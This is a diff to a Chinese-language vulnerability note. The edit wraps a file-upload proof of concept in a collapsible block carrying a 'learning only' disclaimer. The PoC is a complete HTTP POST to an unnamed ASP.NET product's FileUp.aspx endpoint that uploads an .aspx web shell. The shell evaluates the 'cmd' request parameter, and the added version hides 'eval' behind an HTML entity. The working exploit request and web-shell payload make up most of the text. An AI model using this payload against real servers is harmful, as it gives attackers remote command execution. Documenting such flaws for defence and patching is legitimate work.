@@ -36,8 +36,10 @@ tags:
 
 文件上传请求包
 
-```
-POST /Module/FileUpPage/FileUp.aspx?orgid=1&type=NNewsContent HTTP/1.1
+<details>
+<summary>POC 代码（点击展开 · 仅供学习，请勿用于非授权测试）</summary>
+
+<pre><code class="language-text">POST /Module/FileUpPage/FileUp.aspx?orgid=1&amp;type=NNewsContent HTTP/1.1
 Host: 
 Accept-Encoding: identity
 Content-Length: 337
@@ -53,9 +55,10 @@ Content-Type: multipart/form-data; boundary=62907949903a4c499178971c9dab4ad9
 Content-Disposition: form-data; name="Filedata"; filename="abc.aspx"
 Content-Type: image/jpeg
 
-<%@ Page Language="Jscript"%><%Response.Write(FormsAuthentication.HashPasswordForStoringInConfigFile("abc", "MD5").ToLower());eval(Request.Item["cmd"],"unsafe");%>
---62907949903a4c499178971c9dab4ad9--
-```
+&lt;%@ Page Language="Jscript"%&gt;&lt;%Response.Write(FormsAuthentication.HashPasswordForStoringInConfigFile("abc", "MD5").ToLower());&#101;val(Request.Item["cmd"],"unsafe");%&gt;
+--62907949903a4c499178971c9dab4ad9--</code></pre>
+
+</details>
 
 ![](https://typora-notes-1308934770.cos.ap-beijing.myqcloud.com/202205251514756.png)
 
